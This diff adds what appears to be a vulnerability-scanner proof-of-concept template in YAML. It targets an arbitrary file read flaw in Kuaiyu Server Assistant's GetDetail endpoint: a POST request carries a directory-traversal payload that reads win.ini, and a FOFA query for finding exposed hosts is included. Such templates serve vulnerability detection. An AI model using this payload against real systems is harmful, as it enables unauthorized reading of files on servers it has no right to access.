@@ -1,0 +1,18 @@
+id: poc-yaml-kuaiyu-server-assistant-getdetail-anyfile-read
+info:
+  name: 快云服务器助手 GetDetail 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 快云服务器助手
+  fofa: title="快云服务器助手"
+requests:
+- method: POST
+  path: /FileMenu/filemana.aspx/GetDetail
+  headers:
+    Content-Type: application/json; charset=utf-8
+  data: '{"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}'
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(content_type,"application/json")
+variables: {}
+transport: http
